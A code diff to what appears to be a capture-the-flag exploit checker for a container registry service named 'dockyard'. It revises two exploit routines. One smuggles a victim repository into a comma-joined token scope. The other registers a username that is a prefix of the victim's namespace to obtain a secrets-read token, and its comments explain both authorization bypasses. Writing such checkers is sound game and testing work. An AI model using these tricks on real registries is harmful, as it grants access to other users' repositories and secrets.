@@ -398,8 +398,9 @@ async def exploit_scope_comma(task: ExploitCheckerTaskMessage, db: ChainDB):
     with _client(host) as c:
         _register(c, atk_user, atk_pw)
 
-        # request token with comma-scope to get pull on victim + atk repos
-        bad_scope = f"repository:{victim_repo},{atk_repo}:pull"
+        # atk_repo first: canAccess fallback sees parts[0]==atk_user and passes.
+        # CheckAccess then splits "atk_repo,victim_repo" on comma, granting both.
+        bad_scope = f"repository:{atk_repo},{victim_repo}:pull"
         try:
             r = c.get("/token", auth=(atk_user, atk_pw),
                       params={"scope": bad_scope, "service": "dockyard"})
@@ -434,14 +435,14 @@ async def exploit_glob_scope(task: ExploitCheckerTaskMessage, db: ChainDB):
         raise MumbleException("DOCKYARD-EXP3-01: missing attackInfo")
 
     victim_ns = victim_repo.split("/")[0]
-    # register attacker with name that is a prefix of victim_ns
-    # e.g. if victim_ns = "uabcd1234", we register "uabc" (matches "uabc*/*")
-    if len(victim_ns) < 4:
+    if len(victim_ns) < 2:
         raise MumbleException("DOCKYARD-EXP3-02: victim ns too short for prefix attack")
 
-    # attacker registers as a prefix of the victim namespace
-    atk_prefix = victim_ns[:4]
-    atk_user = atk_prefix + _rng(4)  # e.g. "uabc" + random
+    # Register as victim_ns[:-1] (one char shorter than victim_ns).
+    # Bug: HasPrefix(pattern, user) where pattern="victim_ns/*" and user=victim_ns[:-1].
+    # "victim_ns/*" starts with victim_ns[:-1] → scope is allowed.
+    # globMatch("victim_ns/*", "victim_ns/repo") matches via prefix+empty-suffix rule.
+    atk_user = victim_ns[:-1]
     atk_pw = _rng(16)
 
     with _client(host) as c:
@@ -449,12 +450,8 @@ async def exploit_glob_scope(task: ExploitCheckerTaskMessage, db: ChainDB):
         tok = _login(c, atk_user, atk_pw)
         h = {"Authorization": f"Bearer {tok}"}
 
-        # create fine token: scope "secrets:read:uabc*/*"
-        # HasPrefix(pattern="uabc*/*", user="uabcXXXX") fails because "uabc*/*" doesn't start with "uabcXXXX"
-        # but HasPrefix("u*/*", "u") succeeds if we register as "u" (single char)
-        # Actually the bug: HasPrefix(pattern, user) where user="uabc" and pattern="uabc*/*"
-        # "uabc*/*" does start with "uabc" → scope allowed!
-        scope = f"secrets:read:{atk_prefix}*/*"
+        # scope pattern = "victim_ns/*": HasPrefix("victim_ns/*", atk_user) = TRUE
+        scope = f"secrets:read:{victim_ns}/*"
         try:
             r = c.post("/api/tokens", json={"name": "wide", "scopes": [scope]}, headers=h)
         except httpx.TransportError as e:
